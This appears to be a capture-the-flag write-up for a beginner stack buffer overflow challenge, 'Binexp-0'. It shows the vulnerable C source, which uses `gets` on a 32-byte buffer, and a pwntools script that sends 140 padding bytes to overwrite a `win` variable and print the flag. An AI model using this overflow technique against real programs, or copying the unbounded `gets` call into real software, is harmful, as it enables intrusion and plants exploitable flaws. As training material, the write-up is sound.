# Binexp-0

> **Description:** River Flows In You~
>
> **Remote Instance:** nc 54.255.236.13 9000

### Basic File Checks

Perform basic file checks to know how the binary was compiled.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ file binexp-0 
binexp-0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=b177222eda27e1540b74b4416c146500a146ae66, not stripped
```

From the command above, some of the major takeaways are:

- ELF File Type.
- 32-bit.
- Least Significant Bit (LSB) executable.
- Functions name not stripped.

### Static Code Analysis

By looking at the source code, the `gets` function does not limit the input size, which is bound to exceed the buffer limit in a Buffer Overflow attack.

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	int win;
	char buf[32];
	char flag[100];

	win = 0;

	FILE *f = fopen("flag.txt", "r");
	if (f == NULL) {
		puts("'flag.txt' not found.");
		exit(0);
	}

	fgets(flag, 100, f);
	gets(buf);

	if(win != 0) {
		printf("%s\n", flag);
	} else {
		puts("You failed!\n");
	}
}
```

### Solution

We can overwrite the `win` variable by inputting a series of characters that exceed the size of the buffer.

Using pwntools to automate the process:

```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./binexp-0')
rop = ROP(elf)

p = elf.process()
#p = remote('54.255.190.215', 9000)

def exploit():

    padding = b'A'*140

    payload = padding

    p.sendline(payload)

    p.interactive()

def main():
	exploit()

if __name__ == "__main__":
	main()
```

